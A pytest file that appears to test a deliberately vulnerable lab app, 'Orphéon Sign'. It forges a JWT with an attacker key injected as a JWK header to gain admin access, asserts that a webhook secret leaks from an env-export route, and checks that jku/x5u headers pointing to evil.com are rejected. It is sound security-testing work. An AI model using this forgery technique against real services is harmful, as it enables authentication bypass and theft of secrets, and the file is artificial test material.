import pytest
import requests
import json
import base64
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from jose import jwt
from jose.utils import base64url_encode
from jose.backends import RSAKey
import os
import sys

# Add the build directory to the path to import the app
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'build'))

# Global test configuration
BASE_URL = "http://localhost:3206"

@pytest.fixture(scope="session")
def test_session():
    """Create a session for all tests"""
    return requests.Session()

@pytest.fixture(scope="session")
def attacker_keys():
    """Generate attacker RSA key pair for JWK injection tests"""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    public_key = private_key.public_key()
    
    # Convert public key to JWK format
    public_numbers = public_key.public_numbers()
    n = public_numbers.n
    e = public_numbers.e
    
    # Convert to base64url
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    e_bytes = e.to_bytes((e.bit_length() + 7) // 8, 'big')
    
    n_b64 = base64url_encode(n_bytes).decode('utf-8')
    e_b64 = base64url_encode(e_bytes).decode('utf-8')
    
    jwk = {
        "kty": "RSA",
        "n": n_b64,
        "e": e_b64,
        "kid": "attacker-key",
        "alg": "RS256",
        "use": "sig"
    }
    
    return private_key, public_key, jwk

@pytest.fixture(scope="session")
def auth_tokens(test_session):
    """Get authentication tokens for testing"""
    try:
        # Login as employee
        response = test_session.post(
            f"{BASE_URL}/auth/api/login",
            json={"email": "john.doe@orpheon.com", "password": "password123"}
        )
        employee_token = response.json()["token"] if response.status_code == 200 else None
        
        # Login as admin
        response = test_session.post(
            f"{BASE_URL}/auth/api/login",
            json={"email": "admin@orpheon.com", "password": "admin123"}
        )
        admin_token = response.json()["token"] if response.status_code == 200 else None
        
        return employee_token, admin_token
    except:
        return None, None

def create_malicious_token(attacker_keys, role="admin"):
    """Create a malicious JWT token with JWK header injection"""
    private_key, public_key, jwk = attacker_keys
    now = int(time.time())
    
    # Create payload
    payload = {
        "sub": "attacker@evil.com",
        "role": role,
        "iat": now,
        "exp": now + 3600  # 1 hour
    }
    
    # Create header with JWK injection
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": "attacker-key",
        "jwk": jwk  # VULNERABILITY: JWK in header
    }
    
    # Convert private key to PEM format for jose
    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ).decode('utf-8')
    
    # Sign the token with attacker's private key
    token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header)
    return token

def test_health_check(test_session):
    """Test that the application is running"""
    response = test_session.get(f"{BASE_URL}/")
    assert response.status_code == 200
    assert "Orphéon Sign" in response.text

def test_employee_cannot_access_admin(test_session, auth_tokens):
    """Test that employee cannot access admin routes with normal token"""
    employee_token, admin_token = auth_tokens
    
    if not employee_token:
        pytest.skip("Employee token not available - application may not be running")
    
    headers = {"Authorization": f"Bearer {employee_token}"}
    
    # Try to access admin dashboard
    response = test_session.get(f"{BASE_URL}/admin", headers=headers)
    assert response.status_code == 403
    
    # Try to access admin integrations
    response = test_session.get(f"{BASE_URL}/admin/integrations", headers=headers)
    assert response.status_code == 403
    
    # Try to access admin export
    response = test_session.get(f"{BASE_URL}/admin/export/env", headers=headers)
    assert response.status_code == 403

def test_admin_can_access_admin_routes(test_session, auth_tokens):
    """Test that admin can access admin routes with legitimate token"""
    employee_token, admin_token = auth_tokens
    
    if not admin_token:
        pytest.skip("Admin token not available - application may not be running")
    
    headers = {"Authorization": f"Bearer {admin_token}"}
    
    # Access admin dashboard
    response = test_session.get(f"{BASE_URL}/admin", headers=headers)
    assert response.status_code == 200
    
    # Access admin integrations
    response = test_session.get(f"{BASE_URL}/admin/integrations", headers=headers)
    assert response.status_code == 200
    
    # Access admin export
    response = test_session.get(f"{BASE_URL}/admin/export/env", headers=headers)
    assert response.status_code == 200
    assert "ORPHEON_WHSEC_LIVE=" in response.text

def test_jwk_header_injection_bypass(test_session, attacker_keys):
    """Test JWK header injection vulnerability - the main exploit"""
    # Create malicious token with JWK header injection
    malicious_token = create_malicious_token(attacker_keys, role="admin")
    
    headers = {"Authorization": f"Bearer {malicious_token}"}
    
    # Try to access admin dashboard with malicious token
    response = test_session.get(f"{BASE_URL}/admin", headers=headers)
    assert response.status_code == 200, "JWK header injection should allow admin access"
    
    # Try to access admin integrations
    response = test_session.get(f"{BASE_URL}/admin/integrations", headers=headers)
    assert response.status_code == 200
    
    # Try to access admin export and get the secret
    response = test_session.get(f"{BASE_URL}/admin/export/env", headers=headers)
    assert response.status_code == 200
    
    env_content = response.text
    assert "ORPHEON_WHSEC_LIVE=" in env_content
    assert "whsec_live_7e1c1c0b7b0b45cda0a9d0f2b6c2b0a9b3d4c8e7a1f2c3b4d5e6f7a8b9c0d1" in env_content
    
    print(f"\n🎯 VULNERABILITY EXPLOITED SUCCESSFULLY!")
    print(f"🔑 Secret retrieved: {env_content.strip()}")

def test_jku_x5u_rejected(test_session, attacker_keys):
    """Test that jku and x5u are properly rejected"""
    private_key, public_key, jwk = attacker_keys
    now = int(time.time())
    
    # Test jku rejection
    payload = {
        "sub": "attacker@evil.com",
        "role": "admin",
        "iat": now,
        "exp": now + 3600
    }
    
    header_with_jku = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": "attacker-key",
        "jku": "https://evil.com/keys.json"  # Should be rejected
    }
    
    # Convert private key to PEM format for jose
    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ).decode('utf-8')
    
    token_with_jku = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header_with_jku)
    headers = {"Authorization": f"Bearer {token_with_jku}"}
    
    response = test_session.get(f"{BASE_URL}/admin", headers=headers)
    assert response.status_code == 401
    assert "jku and x5u are not allowed" in response.json()["error"]
    
    # Test x5u rejection
    header_with_x5u = {
        "alg": "RS256",
        "typ": "JWT",
        "kid": "attacker-key",
        "x5u": "https://evil.com/cert.pem"  # Should be rejected
    }
    
    token_with_x5u = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header_with_x5u)
    headers = {"Authorization": f"Bearer {token_with_x5u}"}
    
    response = test_session.get(f"{BASE_URL}/admin", headers=headers)
    assert response.status_code == 401
    assert "jku and x5u are not allowed" in response.json()["error"]

def test_documents_access(test_session, auth_tokens):
    """Test that authenticated users can access documents"""
    employee_token, admin_token = auth_tokens
    
    if not employee_token:
        pytest.skip("Employee token not available - application may not be running")
    
    headers = {"Authorization": f"Bearer {employee_token}"}
    
    response = test_session.get(f"{BASE_URL}/documents", headers=headers)
    assert response.status_code == 200
    assert "Document Management" in response.text

def test_login_functionality(test_session):
    """Test login functionality"""
    # Test valid login
    response = test_session.post(
        f"{BASE_URL}/auth/api/login",
        json={"email": "john.doe@orpheon.com", "password": "password123"}
    )
    assert response.status_code == 200
    assert "token" in response.json()
    
    # Test invalid login
    response = test_session.post(
        f"{BASE_URL}/auth/api/login",
        json={"email": "john.doe@orpheon.com", "password": "wrongpassword"}
    )
    assert response.status_code == 401